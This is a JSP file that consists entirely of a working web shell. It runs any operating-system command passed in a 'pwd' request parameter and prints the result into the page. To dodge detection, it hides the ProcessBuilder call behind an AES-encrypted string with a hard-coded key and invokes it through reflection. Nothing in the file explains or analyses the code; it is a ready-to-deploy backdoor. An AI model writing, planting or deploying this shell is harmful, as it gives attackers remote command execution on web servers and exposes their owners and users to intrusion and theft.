<%@ page language="java" import="java.io.*,java.lang.*,java.util.*,java.lang.reflect.Constructor,java.lang.reflect.Method,javax.crypto.*,javax.crypto.spec.*" pageEncoding="utf-8"%>
<%
	if(request.getParameter("pwd")!=null){
		//str="java.lang.ProcessBuilder|||start"
        String enstr="qFWGLcJ6+DjsC7BFu58OlsDDfcYHiyZIUb/uYRLzJ4T8urzcbQKNzXVmpCkT/+qE";
        Cipher cr=Cipher.getInstance("AES");
        String key="sadadadsssssssss";
        cr.init(2,new SecretKeySpec(key.getBytes(),"AES"));
        byte[] bytes=cr.doFinal(Base64.getDecoder().decode(enstr));
        String str=new String(bytes);
        String[] strs=str.split("\\|\\|\\|");
        Class<?> o=Class.forName(strs[0]);
        Class[] parameterTypes={List.class};
        Constructor constructor=o.getConstructor(parameterTypes);
        List<String> parameters=Arrays.asList(request.getParameter("pwd").split(" "));
        Object c=constructor.newInstance(parameters);
        Method method2=(o).getMethod(strs[1]);
        Process ps=(Process) method2.invoke(c);
        InputStream is=ps.getInputStream();
		int a=-1;
		byte[] b = new byte[2048];
			out.print("<pre>");
			while((a=is.read(b))!=-1){
				out.println(new String(b));
			}
			out.print("</pre>");
	}
%>